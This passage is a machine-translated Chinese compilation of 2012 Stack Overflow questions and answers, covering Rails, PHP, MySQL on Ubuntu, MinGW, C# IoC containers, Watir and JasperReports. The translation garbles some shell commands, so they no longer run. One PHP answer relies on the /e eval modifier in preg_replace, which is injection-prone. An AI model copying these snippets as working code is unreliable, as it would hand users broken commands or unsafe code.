        format.html { redirect_to new_response_path }
        format.js
      end
   else
      render 'new'
   end
 end
end 
```

**新的.html.erb**

```
 <div id="response_form">
   <%= render 'form' %>
 </div> 
```

**_form.html.erb**

```
 <%= form_for @response do |f| %>   
    <%= f.radio_button :user_answer, @answer_a.id %> 
    <%= @answer_a.description %>
    <%= f.radio_button :user_answer, @answer_b.id %> 
    <%= @answer_b.description %>
    <%= f.radio_button :user_answer, @answer_c.id %> 
    <%= @answer_c.description %>
    <%= f.submit "Answer" %>                
 <% end %> 
```

下面是我尝试添加 AJAX。但是，它将进入表演动作并进行更新。如何修复我的代码，使其不断重定向到新操作，并且用户可以继续在无限循环上创建新记录？

```
 def create
   @answer_a = Answer.find(rand(1..100))
   @answer_b = Answer.find(rand(1..100))
   @answer_c = Answer.find(rand(1..100))
   @response = current_user.responses.build(params[:response])
   if @response.save
      respond_to do |format|
        format.html { redirect_to new_response_path }
        format.js
      end
   else
      render 'new'
   end
 end 
```

**_form.html.erb**

```
 <%= form_for @response, :remote => true do |f| %>  
    <%= f.radio_button :user_answer, @answer_a.id %> 
    <%= @answer_a.description %>
    <%= f.radio_button :user_answer, @answer_b.id %> 
    <%= @answer_b.description %>
    <%= f.radio_button :user_answer, @answer_c.id %> 
    <%= @answer_c.description %>
    <%= f.submit "Answer" %>                
 <% end %> 
```

**创建.js.erb**

```
 $('#response_form').html('<%= j render("form") %>'); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T01:45:07.553

代码对我来说似乎很好。它不应该重定向到 show 动作。确保：

1.  你有`gem 'jquery-rails'`你的`Gemfile`

2.  你有`<%= javascript_include_tag 'application' %>`你的`application.html.erb`文件

3.  您的`application.js`文件中有以下几行

    ```
    //= require jquery
    //= require jquery_ujs 
    ```

好的，所以这里的问题是您`<%= form_for @response do |f| %>`在`_form`部分中包含了该行。为什么这是个问题？好吧，当一个对象`@response`不存在时，Rails 会像这样呈现表单：

```
<form accept-charset="UTF-8" action="/responses" method="post"> 
```

当一个对象`@response` **确实**存在时，Rails 会像这样呈现表单：

```
<form accept-charset="UTF-8" action="/responses/id_of_the_response" method="post"> 
```

Rails 这样做是因为它知道它`@response`的存在，所以你想要更新它（而不是再次创建它）是合乎逻辑的。

这里的解决方案是将 form_for 更改为：

```
<%= form_for @response, :url => { :action => :create, :method => :post } do |f| %> 
```

另外，请注意`build`不是保存`@response`对象。

# ups - UPS Quantum View API 错误代码：330052

> ID：13280928
> 
> 赞同：4
> 
> 时间：2012-11-08T01:03:40.767
> 
> 标签：ups

我是使用 UPS API 的新手。我一直在寻找一种方法来提取我们帐户下包裹的跟踪信息。我相信 UPS 的 Quantum View API 提供了该功能。

我的问题与破译我得到的错误有关。我知道我的凭证设置为管理级别，并且我拥有正确的 UPS 访问许可证号。

我得到的错误是：**330052**

随附的消息是：**由于以下非活动状态，用户已被阻止下载订阅文件：CompanyQVD、UserQVD。**

此 API 的文档没有说明此消息。

有没有人有这方面的经验并且可以指出我正确的方向来解决这个问题？

谢谢，

刘易斯

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-05T23:15:44.963

如果您遇到与上述相同的错误，那是由于您的 UPS 配置文件中禁用了 Quantum View Data。

您可以通过访问[ups.com](http://ups.com)的跟踪选项卡 -> Quantum View Data 来仔细检查。您还需要登录您的 ups 帐户。

如果禁用，您需要联系您的客户代表以激活此部分。

Quantum View Manage 和 Quantum View Notify 是 2 个独立的服务，Quantum View API 运行在 Quantum View Notify 之外。

他们真的应该改变这些的命名方案......

希望这可以帮助，

-刘易斯

# mysql - 找不到包 mysql 管理员和查询浏览器 (Ubuntu)

> ID：13280931
> 
> 赞同：1
> 
> 时间：2012-11-08T01:04:24.970
> 
> 标签：mysql

我正在尝试在 Ubuntu 上安装 Mysql 服务器。但它没有按预期工作，告诉我错误

> “E: 找不到包 mysql-admin”

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-10T09:14:07.783

按照以下步骤打开终端

步骤1。sudo apt-add-repository 'deb [http://www.tolaris.com/apt/](http://www.tolaris.com/apt/)精确主'

第2步。wget -q [http://www.tolaris.com/apt/tolaris-keyring.gpg](http://www.tolaris.com/apt/tolaris-keyring.gpg) -O- | sudo apt-key 添加 -

第 3 步。sudo apt-get 更新

第4步。sudo apt-get install mysql-query-browser

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T02:02:39.663

自 2009 年 12 月 18 日起，MySQL Admin 和 MySQL Query Browser[都已停止使用](http://dev.mysql.com/support/eol-notice.html)。这两个工具都已被 MySQL Workbench 取代，您可以[从 MySQL 网站](http://dev.mysql.com/downloads/workbench/5.2.html)作为单独的包下载。

# c++ - 使用mingw在windows上编译libnoise

> ID：13280932
> 
> 赞同：4
> 
> 时间：2012-11-08T01:04:31.067
> 
> 标签：c++, mingw

这是我在这里的第一篇文章，如果我做错了什么，请原谅我。

这几天我一直在为此苦苦挣扎，最后我决定承认并寻求帮助。简而言之，我想在 windows 上使用 mingw 编译 libnoise (1.0.0)。但是，似乎缺乏在线可用的信息。

我已经从网站下载了源文件并按照 INSTALL 文本文件中的说明运行命令“CXXFLAGS='-O3 -fomit-frame-pointer' make”（我从 mingW shell 执行） .

此操作的输出可以在[链接](http://textuploader.com/?p=6&id=EOAE7 "关联")中找到（由于它的长度，我已经链接而不是发布输出）。如果我省略 CXXFLAGS 或 fomit-frame-pointer 标志，或者如果我使用 mingw32-make 或 make all 命令，输出不会有太大变化。

它似乎在抱怨丢失的文件，例如

> Makefile:56: ../src/latlon.d: 没有这样的文件或目录

虽然我可以确认它们存在于所述目录中。它也在抱怨别的事情

> c:/mingw/bin/../lib/gcc/mingw32/4.7.0/../../../libmingw32.a(main.o):main.c:(.tex t.startup+0xa7 ): 未定义引用`_WinMain@16' collect2.exe: error: ld returned 1 exit status make[1]: *** [libnoise.so.0.3] Error 1 make[1]: Leaving directory` /c/users/gibbons/desktop/libnoisesrc-1.0.0/noise/src ' make: *** [src] 错误 2

我不知道如何解决这些问题。除了一篇博客[文章](http://kbokonseriousstuff.blogspot.co.uk/2011/08/libnoise-mingw-builds.html "邮政")之外，谷歌搜索并没有真正出现。这也没有真正的帮助，因为我不确定“重命名库名称以赋予它适当的 DLL 扩展名。全部替换即可。”这意味着什么。

任何帮助或建议将不胜感激，我真的很困惑！：-/

干杯

额外信息：我正在运行 Windows 7、64 位和（想想）我在 mingW 4.7.0 上。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T07:31:09.637

1.  别担心`No such file or directory`。这很正常，请看底部的`src/Makefile`解释。
2.  永远不要使用 target `clean`。我无法从中恢复过来。
3.  **删除所有方向来构建`.so`文件**。这些是 linux 文件，不能由 mingw 构建。打开所有`Makefile`s 并注释掉包含`.so`的行，以下行除外：

    `libnoise: libnoise.so libnoise.a libnoise.la`
    `all: libnoise.a libnoise.la libnoise.so.0.3`

    在上面的行中，只删除包含`.so`. 这将阻止构建`.so`目标。

在 中找到**静态库**`src/.libs/libnoise.a`。

**构建 DLL**会有点困难，因为作者使用 Visual Studio 构建它。没有用于构建 dll 的 makefile 目标。需要多准备几行来处理目录中的文件`win32`并从中生成库。

# php - preg_replace 的自定义标记仅限制为 1

> ID：13280934
> 
> 赞同：1
> 
> 时间：2012-11-08T01:04:45.483
> 
> 标签：php, function, preg-replace

**PHP函数：**

```
function b($text) {    
  $body="<b>$text</b>";
  return $body; 
} 
```

**Preg_Replace：**

```
function replaceTags($body) {    
  $body = preg_replace('!\[b](.*?)\[\/b\]!Uei', "''.b('$1','$2').''", $body, -1);    
  return $body; 
} 
```

该代码有效......在一定程度上。它显然每次都仅限于第一个实例。我在复制代码时不小心弄坏了它，将它相互插入，并以粗体显示内部标签。

**例子：**

```
*Code:* [b]This is Hi.[/b] Hello world. [b]This is Hi2.[/b]    
*Output:* **This is Hi.[/b] Hello world. [b]This is Hi2.** 
```

我不熟悉使用**preg_replace**。我认为该模式略有偏差或可能遗漏了一些东西。这就是为什么它只显示第一个实例。我也尝试过使用 MySQL 查询，并且也仅限于一行。

我正在尝试为用户端使用简单的标记，但如果需要，我想使用 MySQL 查询作为自定义标签（同样，有效，但只显示第一条记录）。

谢谢。非常感谢任何帮助或建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T02:05:26.687

`U`从您的正则表达式中删除模式修饰符。它`inverts`是惰性运算符的含义，并使其成为`greedy`. 如果要支持`UTF-8`，请使用`u`（小写）

```
$body = preg_replace('!\[b\](.*?)\[\/b\]!uei', "''.b('$1','$2').''", $body, -1); 
```

# jquery-mobile - 在页面过渡时转移部分 dom

> ID：13280935
> 
> 赞同：0
> 
> 时间：2012-11-08T01:04:58.927
> 
> 标签：jquery-mobile

我有一个简单的 jquery 移动应用程序，其中每个页面都具有以下结构：

```
<div data-role="page">
  <div data-role="header">...</div>
  <div data-role="content">
    <div class="content-primary">...</div>
    <div class="content-secondary">...</div>
  </div>
  <div data-role="footer">...</div>
</div> 
```

这`content-secondary`是一个左侧边栏，很像 jquery 移动文档。这种次要内容永远不会改变，但它可能非常庞大和复杂（在每个页面上重新加载都很昂贵）。我想在转换时**将**相同的 dom 元素从一个页面移动到另一个页面，而不必像 jqm 文档那样在每个页面上都包含它。我只需要在它不存在时加载它，然后在每次页面转换时移动它。关于如何做到这一点的任何提示？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T06:43:22.210

您可以插入`HTML` `content`到您`page`的`pagebeforecreate`处理程序中。

# c# - 由于对象的当前状态，操作无效

> ID：13280942
> 
> 赞同：1
> 
> 时间：2012-11-08T01:06:25.207
> 
> 标签：c#, inversion-of-control

我是一名学生，我的工作是构建自己的 IoC 容器。我已经阅读了一些教程/代码示例并最终创建了它，但是当我尝试创建它的实例时，我得到了主题中的异常。这是我的 IoC 代码和测试代码，我一直在试图找出问题所在，但就是找不到。

国际奥委会

```
public class Mkontener: UnresolvedDependenciesException, IContainer
{
    private readonly Dictionary<Type, object> container = new Dictionary<Type, object> { };

    public void Register(System.Reflection.Assembly assembly)
    {

        Type[] mytypes = assembly.GetTypes();

        foreach (Type t in mytypes)
        {
            if (!container.ContainsKey(t))
            {
                container.Add(t, Activator.CreateInstance(t));
            }
        }
        //throw new NotImplementedException();
    }

    public void Register(Type type)
    {
        if (!container.ContainsKey(type))
        {
            container.Add(type, Activator.CreateInstance(type));
        }
        //throw new NotImplementedException();
    }

    public void Register(object impl)
    {
        Type t = impl.GetType();
        if (!container.ContainsKey(t))
        {
            container.Add(t, impl);
        }

        // throw new NotImplementedException();
    }

    public void Register<T>(Func<T> provider) where T : class
    {

        container.Add(provider.GetType(), provider);
        //throw new NotImplementedException();
    }

    public T Resolve<T>() where T : class
    {

        return (T)Resolve(typeof(T));
    }

    public object Resolve(Type type)
    {
        List<ConstructorInfo> konstruktor = new List<ConstructorInfo> { };
        foreach (ConstructorInfo cons in type.GetConstructors())
        {
            konstruktor.Add(cons);
        }
        if (konstruktor.Count == 0)
        {
            return Activator.CreateInstance(type);
        }
        else
        {
            ConstructorInfo active = null;
            int lparams = 0;
            foreach (ConstructorInfo cnst in konstruktor)
            {
                int inner=0;
                foreach (ParameterInfo a in cnst.GetParameters())
                {
                    inner++;
                }
                if (inner > lparams)
                {
                    active = cnst;
                }

            }
            List<object> lista = new List<object> { };
            foreach(ParameterInfo param in active.GetParameters())
            {
                if (container.ContainsKey(param.GetType()))
                {
                    lista.Add(container[param.GetType()]);
                }
                else
                {
                    //throw new UnresolvedDependenciesException();
                }
            }

            object[] obiekty= lista.ToArray();
            return  Activator.CreateInstance(type, obiekty);
        }
        if (container.ContainsKey(type))
        {
            return container[type];
        }
        else
        {
            //throw new UnresolvedDependenciesException();
        }

    }

    public void Register<T>(T impl) where T : class
    {
        container.Add(impl.GetType(), impl);
    }
} 
```

部分测试单元

```
public void P1__Container_Should_Register_Singleton_As_Object()
{
    // Arrange
    var container = (IContainer)Activator.CreateInstance(LabDescriptor.Container);
    var singleton = new FakeImpl();

    // Act
    container.Register(singleton);
    var result = container.Resolve<IFake>();

    // Assert
    Assert.That(result, Is.Not.Null);
    Assert.That(result, Is.SameAs(singleton));
} 
```

对不起，笨拙的代码等。刚从这里开始。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T02:42:27.957

如果您刚刚开始，尝试对 IOC 容器进行逆向工程并不是您真正应该尝试解决的问题。我重新实现了您提供的代码，填补了一些空白，但据我所知，您错过了容器的要点。

```
class Mkontener: UnresolvedDependenciesException, IContainer 
```

如果 Mkontener 将成为您的容器类，为什么它将看起来像自定义异常的东西扩展为基类？此外，您正在尝试实现 IContainer 接口。如果这是 ComponentModel 的 IContainer，那么您的类将无法编译。如果您创建了自己的 IContainer 接口，那么我建议使用更合适的名称以避免混淆/命名冲突。

IOC 容器通过以下任一方式工作：A）针对接口注册具体类型。（并让容器在被要求提供接口时弄清楚如何设置具体类型的新实例，并管理范围。即单例与每个请求的实例） B）针对接口注册具体实例。（经典的单例行为）

您的实施既没有做。Register 需要接受一个具体类型和一个接口类型。Resolve 将被告知要使用哪个接口，然后构造（或返回）注册的具体类型的实例。像您尝试编写的一个简单示例只不过是一个动态实例工厂。IoC 容器的真正强大之处在于知道如何在对象被请求时自动解决它们的依赖关系。

例如，假设我有以下与实现匹配的接口：IRepository、ILoggingService、IDataService、IMessagingService、IAppController

一旦每个接口都注册了给定的具体类型，其中构造函数看起来像： Repository(IDataService dataService, ILoggingService loggingService)
MessagingService(ILoggingService loggingService)
AppController(IRepository repository, IMessagingService messingService)

注册每个看起来像：

```
MyContainer.Register<LoggingService>().As<ILoggingService>();
MyContainer.Register<DataService>().As<IDataService>();
MyContainer.Register<MessagingService>().As<IMessagingService>();
MyContainer.Register<Repository>().As<IRepository>();
MyContainer.Register<AppController>().As<IAppController>(); 
```

等等

要获得应用控制器，我只需调用：

```
var controller = MyContainer.Resolve<IAppController>(); 
```

容器根据已注册的内容确定如何构造 IRepostory 和 IMessagingService 以及它们的所有依赖项。（如果不能，抛出一个异常，希望能指出开发人员没有正确设置。）

如果您想了解 IOC 容器内部发生的情况，请查看 Autofac。它是一个开源容器，但需要注意的是，IOC 容器中有很多复杂的代码。我觉得很奇怪，课程会尝试让学生使用 IoC 容器重新发明轮子。

# html - 如何获取隐藏元素的值？（女仆）

> ID：13280947
> 
> 赞同：2
> 
> 时间：2012-11-08T01:07:04.957
> 
> 标签：html, ruby-on-rails, ruby, watir

只是想知道，如何使用 watir 获取隐藏元素的值？这是元素：

```
<input type="hidden" value="randomstringhere" id="elementid" name="elementname" /> 
```

这是我的代码自动取款机：

```
require "rubygems"
require "watir-webdriver"
$browser = Watir::Browser.new :ff
$browser.goto("http://www.site.com")
$grabelement = $browser.hiddens(:id, "elementid")
$blah = $grabelement.attribute_value("value")
puts $blah 
```

这卡在最后一行，它返回

```
code.rb:6:in `<main>': undefined method `attribute_value' for #<Watir::HiddenCollection:0x8818adc> (NoMethodError) 
```

对不起，基本问题，我已经进行了搜索，但找不到任何东西。

提前致谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-08T02:17:36.547

**问题**

您的代码非常接近。问题是这条线：

```
$grabelement = $browser.hiddens(:id, "elementid") 
```

该行表示要获取具有 id "elementid" 的隐藏元素的集合（即全部）。正如错误消息所说，该集合没有 attribute_value 方法。只有元素（即集合中的对象）具有该方法。

**解决方案（假设单个隐藏与匹配的id）**

假设只有一个，你应该只使用`hidden`而不是获得第一个匹配项`hiddens`（即删除`s`）：

```
$grabelement = $browser.hidden(:id, "elementid")
$blah = $grabelement.value
puts $blah
#=> "randomstringhere" 
```

请注意，对于 value 属性，您可以只做`.value`而不是`.attribute_value('value')`.

**解决方案（如果有多个具有匹配 id 的隐藏）**

如果实际上有多个，那么您可以遍历集合或只获取第一个，等等：

```
#Iterate over each hidden that matches
browser.hiddens(:id, "elementid").each{ |hidden| puts hidden.value }

#Get just the first hidden in the collection
browser.hiddens(:id, "elementid").first.value 
```

# jquery - 如何在通过 ajax (jquery) 创建的元素上添加 css？

> ID：13280948
> 
> 赞同：2
> 
> 时间：2012-11-08T01:07:09.760
> 
> 标签：jquery, css, ajax, dynamically-generated

我有一个带有 CSS 文件图形样式的购物车。但是，当我通过 jQuery 和 AJAX 更新购物车时，重新加载的版本没有样式。

是否有任何 jQuery 函数可以将已加载的样式应用于动态生成的元素？

我知道我可以使用`.css()`函数手动添加样式，但我宁愿避免这种情况并能够自动加载现有属性，这样如果我进行更改就不会变得混乱。

谢谢，亲切的问候。

* * *

对不起，伙计，我想我有点困惑或其他什么。它可以自行工作，无需任何特殊代码即可自动识别 css。我不确定它之前为什么会失败，我已经重写了代码，所以我不知道，但我猜在声明类时某个地方出现了错误。

无论如何：在 css 和 html 中正确使用类时，这不是问题，它可以正常工作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T01:21:31.727

虽然添加类可以解决它。有什么奇怪的。

您说当您通过 javascript 更新它时，您会丢失样式。这没有意义。

破坏样式的唯一方法是更改​​ dom（因此根据样式规则，新购物车与旧购物车不同）或者旧购物车是内联样式的，并且您清理了它的样式。

如果它是内联 CSS，您可以保存内联样式 document.getElementById("cart").style.cssText 并将其应用于新购物车。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T01:11:43.637

如果你在你的 css 中使用类，你可以使用`.addClass`方法来添加你想要的类。声明内联 css 明显不那么混乱。

# ruby - Rails 将类型附加到带有 has_many 的连接表中：通过和关联扩展

> ID：13280949
> 
> 赞同：2
> 
> 时间：2012-11-08T01:07:11.357
> 
> 标签：ruby, ruby-on-rails-3, activerecord, associations

我与 Rails 中的扩展有一个 AR 关联，类似于此链接中提供的示例： [ActiveRecord Association Extensions](http://railsadventures.wordpress.com/2012/08/28/activerecord-association-extensions/)

```
has_many :issues, :through => :qbert_issues do
  def tracking
    where("qbert_issues.kind = ?", "tracking")
  end

  def blocking
    where("qbert_issues.kind = ?", "blocking")
  end
end 
```

如上所示，我的是多类型的......我需要在我的连接表中填充一个“种类”列。理想情况下，这应该可以工作：

```
q = QBert.find(123)
q.issues.tracking << Issue.find(234) 
```

因此，文章建议重载`<<`并执行以下操作：

```
has_many :issues, ... do
  ...
  def <<(issue)
    issue.kind = "UserAccount"
    proxy_association.owner.issues += [issue]
  end
end 
```

如果 kind 是静态的，那就太好了。

看来我可以做到这一点...

```
has_many :issues, ... do
  ...
  def <<(*args)
    issue, kind = args.flatten
    issue.kind = kind
    proxy_association.owner.issues += [issue]
  end
end 
```

这至少可以让我这样做：

```
q = QBert.find(123)
q.issues.tracking << [Issue.find(234), :tracking] 
```

这对我来说似乎不是很干燥......有更好的方法吗？如果您考虑到 kind 访问器不在连接表中，则可以加分`qbert_issues`。我猜我只需要`QBertIssue`直接通过模型手动添加关联。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T02:37:41.153

弄清楚了...

```
def <<(issue)
  kind = where_values.second.scan(/kind = '(.*)'/).flatten.first
  left = proxy_association.reflection.source_reflection
  right = proxy_association.reflection.through_reflection

  left.active_record.create(left.foreign_key.to_sym => issue.id, 
                            right.foreign_key.to_sym => proxy_association.owner.id, 
                            :kind => kind)
end 
```

这让我可以：

```
q = QBert.find(123)
q.issues.tracking << Issue.find(234) 
```

`where_values`通过解析并将它们合并到参数散列中，可以使其充分泛化。

`Pry`岩石，顺便说一句：D

# php - 使用变量名数组在 foreach 循环中设置变量的 PHP 语法

> ID：13280951
> 
> 赞同：0
> 
> 时间：2012-11-08T01:07:28.163
> 
> 标签：php, variables, loops, foreach

我试图通过从同名的 SESSION 和 POST 变量中设置它们来定义一组变量。（即我想将 $_SESSION['a'] 转移到 $a。

我正在尝试使用变量名称数组（a，b，c）来使用 foreach 循环定义这样的集合，但是在尝试定义它们时，我最终会在循环中使用 $$variable 之类的语法，这确实不行。我在 $ 变量周围尝试了单引号和双引号，但没有任何乐趣

```
$data = array (
        'a',
        'b',
        'c',
              );

foreach($data as $variable)
 {
   if (isset($_POST['$variable'])) $_SESSION['$variable']=$_POST['$variable'];
   if (isset($_SESSION['$variable'])) {$$variable=$_SESSION['$variable'];} else {$$variable="";}
 } 
```

非常感谢任何帮助。

我正在尝试以许多类似的实例结束：

```
 if (isset($_POST['$a'])) $_SESSION['$a']=$_POST['$a'];
 if (isset($_SESSION['$a'])) {$a=$_SESSION['$a'];} else {$a="";} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T01:12:41.140

单引号防止 $variable 被评估，只需将它们取出。

```
$data = array (
        'a',
        'b',
        'c',
              );

foreach($data as $variable)
 {
   if (isset($_POST[$variable])) $_SESSION[$variable]=$_POST[$variable];
   if (isset($_SESSION[$variable])) {$$variable=$_SESSION[$variable];} else {$$variable="";}
 } 
```

# image-processing - OpenCV - 从数独谜题中删除网格线

> ID：13280952
> 
> 赞同：3
> 
> 时间：2012-11-08T01:07:40.783
> 
> 标签：image-processing, opencv, sudoku

我正在编写一个 Android 应用程序来从图片中提取数独谜题。对于 9x9 数独网格中的每个单元格，我需要确定它是否包含数字 1 到 9 之一或是否为空白。以下是我的算法的大致思路：

*   自适应阈值之谜
*   扩张以减少要考虑的轮廓数量
*   找到拼图的轮廓并将其变形为正方形
*   将正方形分成 81 个相等的单元格；寻找**至少有 20% 白色像素的单元格**
*   找到最靠近这些单元格中心的白色斑点并得到它的边界矩形
*   对边界矩形内的图像部分使用字符识别（k-nearest neighbours/Tesseract/etc.）

虽然我可以使用简单的填充来移除数独谜题的粗外边界，但内部网格线并不连续，即使在膨胀之后也是如此，并且不能那么容易地移除。为了说明，这里是去除外部网格线后的示例数独：

![在此处输入图像描述](../Images/fc333bf0d3c789812396551d3c7f859e.png)

**问题**：有时，一个单元格中有足够的网格线，超过 20% 的像素是白色的，所以**我误认为该单元格**中有一个数字。以下是此类单元格的示例：

![在此处输入图像描述](../Images/9779f62791d6074a54b3d55d1a975553.png)

我考虑过使图像变形以降低内部网格线的可见性。我可以使用霍夫变换或[这篇](https://stackoverflow.com/questions/10196198/how-to-remove-convexity-defects-in-sudoku-square/11366549#11366549)文章中描述的方法来找到网格线作为展开的前奏。但是，我没有看到展开变形的任何其他显着好处，并且完全删除网格线应该既安全又容易。

或者，我可以修改我的预处理，以便内部网格线保持不变。目前我的预处理是：

```
 Imgproc.GaussianBlur(mat, mat, new Size(11,11), 0);
    Imgproc.adaptiveThreshold(mat, matBW, 255, 
        Imgproc.ADAPTIVE_THRESH_MEAN_C, Imgproc.THRESH_BINARY_INV, 5, 2);
    Mat kernel = Imgproc.getStructuringElement(Imgproc.MORPH_CROSS, new Size(3, 3));
    Imgproc.dilate(matBW, matBW, kernel); 
```

高斯模糊对于在阈值化之前减少噪声是必要的。膨胀是为了确保外部网格线已连接，但不足以重新连接内部线。

**我怎样才能始终如一地删除内部网格线，而不影响图像的其余部分？**

非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T03:40:41.673

如果您不想进行适当的 unwarp，则可能值得使用较小的单元格进行 digit_present 测试。

假设左上角的单元格具有坐标 (x1,y1,x2,y1)==(0,0,10,10)。您可以将新单元格定义为 (x1+k,y1+k,x2-k,y2-k), k=min(x2-x1,y2-y1)/4

另一种可能有效的策略是在测试前使用[腐蚀](http://docs.opencv.org/modules/imgproc/doc/filtering.html)，具体取决于网格线与数字的粗细。

最后，您可以将所有单元格提供给您的分类器，并使用其置信度索引（如果有）；如果分类器置信度太低，则可能不是数字。

如果所有这些方法都失败了，为了进行填充，无论如何你都必须获得网格线的翘曲，所以你不妨进行反翘曲

# html - 是否需要特定的 Doctype？

> ID：13280955
> 
> 赞同：0
> 
> 时间：2012-11-08T01:08:17.887
> 
> 标签：html, validation, markup

主题标题确实是问题。是否需要特定的 DocType？如果有，在什么情况下？

我正在为一个拥有相当大用户群的 Wordpress 插件设计一个 jQuery 幻灯片脚本。因此，它需要被设计成可以处理很多用例。我正在尝试决定是否应该使用数据属性或仅用于 Javascript 参考的信息类（'js-transition-slide、js-transition-fade 等）。

当事情变得复杂时使用数据属性要容易得多，例如设置数值（js-delay-500等），但它是HTML5。这对我个人或 99% 的用户来说并不困扰，但在过去（因为做类似的事情），我曾被一位用户联系过，他们担心他们的页面由于插件标记而使用特定的 DocType 无效。我完全不记得为什么需要这个 DocType（丢失了电子邮件），但我认为它可能与某些 HTTPS 支付页面和安全验证有关。我实际上认为这可能与不是 HTTPS 的插件链接之一有关。真的很模糊，我知道。

我想这会带来另一个问题。是否也正式要求有效标记？

感谢任何可以启发我的人。同样，我完全支持 HTML5，就像大多数人一样，但鉴于此类事物的性质（如 Wordpress 插件），支持广泛的用例而不疏远特定用户（或至少为他们提供替代方案）可能很重要选项）。

# query-string - jrxml文件中的查询不起作用

> ID：13280956
> 
> 赞同：2
> 
> 时间：2012-11-08T01:08:21.500
> 
> 标签：query-string

我正在尝试使用 JasperReports 创建报告，但是每当我运行脚本时，它总是会返回一个错误，指出发现以元素“queryString”开头的无效内容，我猜我没有在 queryString 元素中安排查询

这是jrxml代码

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE jasperReport PUBLIC "//JasperReports//DTD Report Design//EN"
"http://jasperreports.sourceforge.net/dtds/jasperreport.dtd">
<jasperReport name="staff">

<field name="staffId" class="java.lang.String"/>
<field name="firstName" class="java.lang.String"/>
<field name="lastName" class="java.lang.String"/>
<field name="email" class="java.lang.String"/>
<field name="password" class="java.lang.String"/>

<queryString><![CDATA[select * from staff]]>
</queryString>

<pageHeader>
<band height="30">
<staticText>
<reportElement x="0" y="0" width="69" height="24"/>
<textElement verticalAlignment="Bottom"/>
<text>
<![CDATA[Staff ID: ]]>
</text>
</staticText>
<staticText>
<reportElement x="140" y="0" width="69" height="24"/>
<text>
<![CDATA[First Name: ]]>
</text>
</staticText>
<staticText>
<reportElement x="280" y="0" width="69" height="24"/>
<text>
<![CDATA[Last Name: ]]>
</text>
</staticText>
<staticText>
<reportElement x="420" y="0" width="69" height="24"/>
<text>
<![CDATA[Email: ]]>
</text>
</staticText>
<staticText>
<reportElement x="420" y="0" width="69" height="24"/>
<text>
<![CDATA[Password: ]]>
</text>
</staticText>
</band>
</pageHeader>

<detail>
<band height="30">
<textField>
<reportElement x="0" y="0" width="69" height="24"/>
<textFieldExpression class="java.lang.String">
<![CDATA[$F{staffId}]]>
</textFieldExpression>
</textField>
<textField>
<reportElement x="140" y="0" width="69" height="24"/>
<textFieldExpression class="java.lang.String">
<![CDATA[$F{firstName}]]>
</textFieldExpression>
</textField>
<textField>
<reportElement x="280" y="0" width="69" height="24"/>
<textFieldExpression class="java.lang.String">
<![CDATA[$F{lastName}]]>
</textFieldExpression>
</textField>
<textField>
<reportElement x="420" y="0" width="69" height="24"/>
<textFieldExpression class="java.lang.String">
<![CDATA[$F{email}]]>
</textFieldExpression>
</textField>
<textField>
<reportElement x="420" y="0" width="69" height="24"/>
<textFieldExpression class="java.lang.String">
<![CDATA[$F{password}]]>
</textFieldExpression>
</textField>
</band>
</detail>
</jasperReport> 
```

然后我删除了 Stringquery 元素和 JasperViewer 打开但没有内容。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T11:19:30.173

请看[这里](http://mssqlwithiireports.blogspot.in/2012/11/simle-java-program-to-generate-report.html)

我在 ireports Designer 4.8 的帮助下创建了 jrxml 文件，查询是该文件的一部分，并且相同的报告文件也可以使用 java 代码。

# java - PowerMock - 存根父方法调用不返回存根值

> ID：13280958
> 
> 赞同：1
> 
> 时间：2012-11-08T01:08:50.743
> 
> 标签：java, junit, powermock, stubbing

两班。父：B。子：AAmethod1() 覆盖 B。

```
public class B {
    protected boolean method1(){...};
}

public class A extends B {
    protected boolean method1(){
        boolean val = super.method1();
        ... //very short segment of logic that doesn't affect val.
        return val;
    }
} 
```

在我的测试课里面：

```
@Test
public void testA() {
    stub(method(B.class, "method1")).toReturn(true);
    assertTrue((Boolean)(Whitebox.invokeMethod(A.class, "method1")));
} 
```

断言失败（它返回 false）。我错过了什么吗？感谢您提前提供任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-19T21:31:17.117

您测试的方法是非静态方法。我认为，您只能为模拟实例存根非静态方法。因此，您不能将类对象传递给存根。

# velocity - Velocity 中当前模板文件的路径

> ID：13280959
> 
> 赞同：0
> 
> 时间：2012-11-08T01:09:00.117
> 
> 标签：velocity, templating

假设我有以下模板：

1.  .../main.vm
2.  .../sections/footer.vm

假设 main.vm 看起来像这样：

```
Hello world, this is the main template, it's name is $name
This template also has the following footer:
#parse("sections/footer.vm") 
```

假设 footer.vm 看起来像这样：

```
Hi there, I'm the footer! My file name is $name! 
```

我希望 main.vm 中的 $name 为“main.vm”，而 footer.vm 中的 $name 为“sections/footer.vm”。这样的事情可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T20:37:29.047

除非您覆盖 的行为`#parse`，或提供您自己的解析宏或指令，否则不会执行以下操作：

```
#macro(include $templateName)
  #set($name = $templateName)
  #parse($templateName)
#end 
```

# ios - 从 UIWebView 捕获打印请求

> ID：13280972
> 
> 赞同：1
> 
> 时间：2012-11-08T01:10:36.170
> 
> 标签：ios, uiwebview, airprint

我有一个应用程序是网站的包装器。它允许我们将第三方网络应用程序用于我们业务中的某些服务。它将做的一件事是打印标签。在移动 safari 中，如果我进行设置并按下打印，请求会在 safari 中处理，我可以使用空中打印毫无问题地进行打印。

在我的自定义应用程序中，uiwebview 发出了相同的请求，但是没有任何内容发送到打印机。我添加了一个弹出框，我可以手动提交打印作业，但我无法捕获来自 web 视图的任何打印请求。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T21:30:52.367

